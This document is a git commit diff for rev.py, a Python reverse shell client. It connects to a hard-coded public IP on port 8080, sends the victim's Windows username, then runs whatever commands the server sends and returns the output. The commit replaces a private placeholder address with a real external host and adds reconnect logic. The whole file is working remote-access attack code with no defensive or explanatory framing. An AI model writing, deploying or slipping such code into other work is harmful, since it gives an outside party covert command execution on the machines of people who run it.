9a5a1678828206781d54f47e4a77c370d852ad2e
saif <saif.aboueldahab@gmail.com>
2023-05-28 05:33:23 +0300

    public testing

--- rev.py
+++ rev.py
@@ -1,36 +1,40 @@
 import socket
+import time
 import subprocess
 
 # Set up the server address and port
-server_address = '192.168.1.100'  # Replace with your server's IP address
+server_address = '156.196.54.233'  # Replace with your server's IP address
 server_port = 8080                # Replace with your server's port
 
+username = subprocess.getoutput("""echo %username%""")
 
 # Connect to the server
-while True:
-    try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        break
-    except:
-        pass
+
 
 while True:
     # Create a socket object
-    username = subprocess.getoutput("""echo %username%""")
-
     try:
+        time.sleep(2)
+        print("trying to connect")
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect((server_address, server_port))
+        time.sleep(1)
         client_socket.send(username.encode())
+        print("send")
 
         # Receive commands from the server and execute them
         while True:
-            command = client_socket.recv(1024).decode()
-            if command.lower() == 'exit':
+            try:
+                command = client_socket.recv(1024).decode()
+                if command.lower() == 'exit':
+                    break
+                output = subprocess.getoutput(command)
+                print(output)
+                client_socket.send(output.encode())
+            except:
                 break
-            output = subprocess.getoutput(command)
-            print(output)
-            client_socket.send(output.encode())
     except:
+        print("sdf")
         pass
 
 
